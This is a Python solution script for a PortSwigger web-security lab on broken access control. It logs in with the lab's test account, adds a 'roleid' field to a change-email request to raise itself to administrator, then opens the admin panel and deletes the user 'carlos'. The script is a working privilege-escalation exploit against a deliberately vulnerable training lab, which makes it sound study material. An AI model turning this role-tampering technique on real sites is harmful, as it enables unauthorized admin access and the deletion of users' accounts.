"""
https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile
"""

import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

login_url = f'https://{site}/login'
login_data = { 'password' : 'peter', 'username' : 'wiener'}
resp = s.post(login_url, data=login_data)

change_url = f'https://{site}/my-account/change-email'
json_data = {'email' : 'OdinID@pdx.edu', 'roleid': 2}
resp = s.post(change_url,json=json_data, allow_redirects = False)

url = f'https://{site}/admin'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')

carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]

delete_uri = carlos_delete_link[0]['href']
s.get(f'https://{site}{delete_uri}')
